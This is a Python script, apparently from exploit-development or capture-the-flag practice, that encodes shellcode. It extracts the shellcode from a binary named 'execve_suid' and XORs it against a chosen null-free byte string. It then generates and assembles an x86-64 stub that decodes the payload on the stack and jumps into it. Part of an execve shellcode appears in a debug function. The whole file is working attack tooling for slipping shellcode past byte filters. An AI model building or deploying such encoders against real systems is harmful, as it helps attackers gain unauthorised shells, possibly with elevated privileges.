import subprocess
from Cryptodome.Util.number import long_to_bytes, bytes_to_long

# XOR encoding


# Recuperer le shellcode qu'il faut exécuter
INFO    = "[INFO]   "
ERROR   = "[ERROR]  "
SUCCESS = "[SUCCES] "

dir = './'
shellcode = "execve_suid"
encoded   = "wished_encoding"
asmres    = "ress.s"
executable = "exec"

def get_shellcode(file_path):
    # Extract .text section
    subprocess.run(['objcopy', '-O', 'binary', '--only-section=.text', file_path, 'shellcode.bin'])
    with open('shellcode.bin', 'rb') as f:
        return f.read()

def pad_shellcode(shellcode):
    if len(shellcode) % 4 != 0:
        print(INFO + "Padding the shellcode with `nop` instructions")
        shellcode += b'\x90' * (4 - len(shellcode) % 4)
    return shellcode

# Recuperer l'encodage souhaité du shellcode

def get_encoded_file(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    return data
    
def add_padding(shellcode, expected_length, padding_data=b'\x90'):
    while len(shellcode) < expected_length:
        shellcode += padding_data
    return shellcode
    
# Génerer le masque XOR
def create_XOR_mask(shellcode, encoded):
    if len(shellcode) != len(encoded):
        print(ERROR + "The length of the shellcode and the encoded code doesn't match in the `create_XOR_mask` function")
        exit(1)
    
    xor_mask = long_to_bytes(bytes_to_long(shellcode) ^ bytes_to_long(encoded))
    return xor_mask

# Verfifier que l'encodage ^ masque = shellcode
def ensur_XOR_isCorrect(shellcode, encoded, mask):
    if(len(shellcode) != len(encoded) or len(shellcode) != len(mask)):
        print(ERROR + "The lenght of the shellcode, the encoded code and  doesn't match in the `ensur_XOR_isCorrect` function")
    for sc_byte, enc_byte, mask_byte in zip(shellcode, encoded, mask):
        if sc_byte != (enc_byte ^ mask_byte):
            print(ERROR + "XOR verification failed")
            exit(1)
    print(SUCCESS + "XOR verification succeeded")
    return True

# Vérifier que le shellcode ne dispose pas de caractères \x00
def ensure_no_null_bytes(code, what):
    if(b'\x00' in code):
        print(ERROR + f"NULL bytes ('\\x00') in the {what} code")
        exit(1)
    print(SUCCESS + f"No NULL bytes ('\\x00') detected in the {what} code")


# ecrire le code assembler
def write_assembly(mask, encoding, file_path):
    with open(file_path, 'w') as f:
        f.write(f"""\t.global _start
\t.text
_start:
\tpush %rbp
\tmov %rsp, %rbp
\tsub $0x200, %rsp
\tjmp trois

un:
\tpop %rsi
\tmov %rsp, %rdi
\tmov ${len(encoding)}, %ecx
\tcld
\trep movsb
\tmov %rsp, %rsi
\tjmp deux

deux:\n""")
        
        # Existing XOR instructions generation
        i = 0
        while i < len(mask) - 3:
            f.write(f"\txorl $0x{mask[i+0]:02x}{mask[i+1]:02x}{mask[i+2]:02x}{mask[i+3]:02x}, (%rsi)\n")
            f.write("\tadd $4, %rsi\n")
            i += 4
        while i < len(mask):
            f.write(f"\txorb $0x{mask[i]:02x}, (%rsi)\n")
            if i < len(mask)-1:
                f.write("\tinc %rsi\n")
            i += 1
        
        f.write("""\tjmp *%rsp

trois:
\tcall un
quatre:
\t.byte """)
        
        # Existing byte array generation
        for i in range(len(encoding)):
            f.write(f"0x{encoding[i]:02x}" + (", " if i < len(encoding)-1 else ""))
        f.write("\n\n")


def compiler_assembler(file_path, executable):
    result = subprocess.run(['as', file_path, '-o', file_path + '.o'], stdout=subprocess.PIPE)
    result = subprocess.run(['ld', file_path + '.o', '-o', executable], stdout=subprocess.PIPE)
    result = subprocess.run(['rm', file_path + '.o'], stdout=subprocess.PIPE)

    if result.returncode != 0:
        print(ERROR + "Compilation failed")
        exit(1)
    else:
        print(SUCCESS + "Compilation succeeded")

def main():

    shellcode_data = get_shellcode(dir + shellcode)
    encoding = get_encoded_file(dir + encoded)

    shellcode_data = pad_shellcode(shellcode_data)

    if len(encoding) < len(shellcode_data):
        print(ERROR + f"The encoding data isn't long enough ({len(encoding)}) compared to the shell code data ({len(shellcode_data)})")
        exit(1)
    if len(encoding) == len(shellcode_data):
        print(SUCCESS + "Lenght of the shellcode and encoding match perfectly")
    else:
        print(INFO + "The encoding is bigger than the shellcode, adding `nop` padding into the shellcode")
        shellcode_data = add_padding(shellcode_data, len(encoding))

    ensure_no_null_bytes(encoding, 'encoded')
    mask = create_XOR_mask(shellcode_data, encoding)
    ensure_no_null_bytes(mask, 'mask')
    ensur_XOR_isCorrect(shellcode_data, encoding, mask)

    print(INFO + 'encoding: ' + ''.join(f'\\x{byte:02x}' for byte in encoding))
    write_assembly(mask, encoding, dir + asmres)
    compiler_assembler(dir + asmres, dir + executable)

    print("===============")
    top = 8
    print(''.join(f'\\x{byte:02x}' for byte in encoding[:top]))
    print(''.join(f'\\x{byte:02x}' for byte in mask[:top]))
    print(''.join(f'\\x{byte:02x}' for byte in shellcode_data[:top]))

def debug():

    encoding       = b'\x41\x41\x41\x41\x41\x41\x41\x41'
    shellcode_data = b'\x6a\x3b\x58\x48\x31\xf6\x48\x89'
    

    mask = create_XOR_mask(shellcode_data, encoding)

    print(encoding)
    print(''.join(f'\\x{byte:02x}' for byte in encoding))
    
    print(''.join(f'\\x{byte:02x}' for byte in mask))

    print(''.join(f'\\x{byte:02x}' for byte in shellcode_data))

    # write_assembly(mask, encoding, dir + asmres)

    # compiler_assembler(dir+asmres, 'prec')

if __name__ == '__main__':
    main()
    #debug()